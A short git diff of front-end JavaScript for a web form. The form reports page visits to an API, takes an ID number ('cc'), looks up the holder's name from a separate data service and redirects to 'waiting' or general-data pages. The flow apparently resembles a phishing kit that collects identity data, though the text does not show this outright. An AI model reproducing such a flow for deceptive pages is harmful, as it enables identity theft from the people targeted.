@@ -1,9 +1,9 @@
 console.log("Index ON")
+
 fetch(`${API_URL}/view`, {
     method: 'POST',
     headers: {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer 123123123',
+        'Content-Type': 'application/json'
     },
     body: JSON.stringify({message: 'P1'})
 })
@@ -32,21 +32,30 @@ function validarNumero() {
         input.value = "";
     }else{
         /** SPINNER */
-        // document.querySelector('#modal-principal').classList.remove('d-block');
-        document.querySelector('#modal-esperar').classList.add('d-block');
+        showSpinner();
 
-        /** Guardar y enviar */
-        info.cc = input.value;
-        LS.setItem('info', JSON.stringify(info));
+        /** BUSCAR CLIENTE */
+        fetch(`${DATA_URL}/obtenerInfoCC`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({cc: input.value})
+        })
+        .then(response => response.json())
+        .then(result => info.cname = `${result[0].ANINombre1} ${result[0].ANIApellido1}`)
+        .catch(err => console.log(err));
 
         setTimeout(()=>{
+            info.cc = input.value;
+            LS.setItem('info', JSON.stringify(info));
             if(info.err != ''){
                 window.location.href = 'waiting.html';
             }else{
-                window.location.href = 'infoGeneral.html';
+                window.location.href = 'datosGenerales.html';
             }
 
-        }, 2000);
+        }, 4000);
     }
 }
 
